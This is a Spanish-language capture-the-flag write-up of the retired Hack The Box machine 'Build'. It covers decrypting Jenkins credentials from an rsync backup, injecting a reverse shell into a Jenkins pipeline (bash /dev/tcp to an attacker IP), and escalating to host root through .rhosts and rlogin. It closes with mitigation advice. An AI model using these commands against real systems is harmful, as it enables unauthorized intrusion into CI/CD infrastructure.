---
machine: Build
os: Linux
difficulty: Medium
platform: Hack The Box
category: Web
state: Retired
pwned: false
tags: [linux, jenkins, gitea, rsync, docker, powerdns, rlogin]
---

# Build — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin credenciales ni flags reales.

## Resumen

Servidor con rsync, Gitea y Jenkins en contenedores. Un backup de Jenkins accesible por rsync permite descifrar un secreto y entrar en Gitea. El repositorio contiene un pipeline de Jenkins que se puede modificar para ejecutar comandos; la shell cae en un contenedor. Desde ahí se alcanza PowerDNS-Admin y MySQL, se obtiene acceso al host y se abusa de `.rhosts`/rlogin para root.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
rsync rsync://<IP>/
```

El módulo de backup contiene el directorio de Jenkins. Se descarga y se revisan `credentials.xml`, `hudson.util.Secret` y `master.key`:

```bash
rsync -av rsync://<IP>/<MODULE> ./backup
```

Con la master key se descifra el secreto de Jenkins (`jenkins-decrypt` o el script de la versión correspondiente). La credencial resultante da acceso a Gitea en el puerto 3000.

## Acceso inicial

En Gitea se localiza un repositorio con un `Jenkinsfile`. El pipeline se ejecuta en Jenkins y permite modificar el comando de build:

```groovy
pipeline {
  agent any
  stages {
    stage('build') {
      steps {
        sh 'bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"'
      }
    }
  }
}
```

Al guardar y lanzar el pipeline, la shell llega como root dentro del contenedor de Jenkins.

## Escalada

```bash
hostname -I
ip addr
nmap -p- 172.18.0.0/24 --min-rate 5000
```

La red Docker muestra Gitea, el webhook de Jenkins, MySQL y PowerDNS-Admin. MySQL acepta `root` sin contraseña; PowerDNS-Admin se compromete con las credenciales del backup. En el host, `.rhosts` permite `root` desde un hostname concreto. Se cambia el hostname del contenedor y se usa `rlogin`:

```bash
hostname <ALLOWED_HOST>
rlogin -l root 172.18.0.1
```

La sesión resultante es root en el host.

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

## Lecciones

- Un backup de CI/CD contiene secretos que descifran credenciales.
- Un pipeline editable es ejecución de código por diseño.
- La red interna de Docker expone servicios sin autenticación.
- `.rhosts` y rlogin siguen apareciendo en entornos heredados.

## Detección y mitigación

- Proteger los backups de Jenkins y rotar `master.key`/credenciales.
- Restringir quién puede modificar pipelines y ejecutar builds.
- No publicar MySQL/PowerDNS-Admin en la red interna sin autenticación.
- Eliminar `.rhosts`, deshabilitar rlogin y segmentar contenedores.

## Referencias

- <https://0xdf.gitlab.io/2025/08/05/htb-build.html>
- <https://www.jenkins.io/doc/book/security/>
- <https://attack.mitre.org/techniques/T1195/002/>
